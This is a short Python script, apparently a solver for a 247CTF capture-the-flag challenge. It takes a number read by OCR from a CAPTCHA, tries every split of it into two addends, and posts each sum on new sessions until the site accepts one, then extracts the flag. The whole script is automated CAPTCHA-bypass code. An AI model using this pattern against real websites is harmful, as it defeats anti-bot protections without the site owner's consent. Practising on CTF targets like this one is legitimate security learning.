#!/usr/bin/env python3
import requests

BASE_URL = "https://087ba594e710a16e.247ctf.com/"

# EasyOCR detectó: 5587405099746
number_str = "5587405099746"

print(f"Probando todas las divisiones de: {number_str}\n")

# Crear sesión principal
main_session = requests.Session()
main_session.get(BASE_URL)
main_session.get(BASE_URL + "mturk.php")

# Probar todas las divisiones posibles
for split in range(1, len(number_str)):
    a_str = number_str[:split]
    b_str = number_str[split:]
    
    a = int(a_str)
    b = int(b_str)
    result = a + b
    
    # Crear nueva sesión
    test_session = requests.Session()
    test_session.get(BASE_URL)
    test_session.get(BASE_URL + "mturk.php")
    
    data = {"captcha": str(result)}
    response = test_session.post(BASE_URL, data=data)
    
    status = "✓✓✓" if "invalid" not in response.text.lower() else "✗"
    
    print(f"{split:2d}. {a_str} + {b_str} = {result} : {status}")
    
    if status == "✓✓✓":
        print(f"\n¡ENCONTRADO! División en posición {split}")
        print(f"Ecuación: {a} + {b} = {result}")
        
        if "flag" in response.text.lower() or "247ctf{" in response.text.lower():
            import re
            flag_match = re.search(r'247CTF\{[^}]+\}', response.text, re.IGNORECASE)
            if flag_match:
                print(f"\nFLAG: {flag_match.group(0)}")
        break
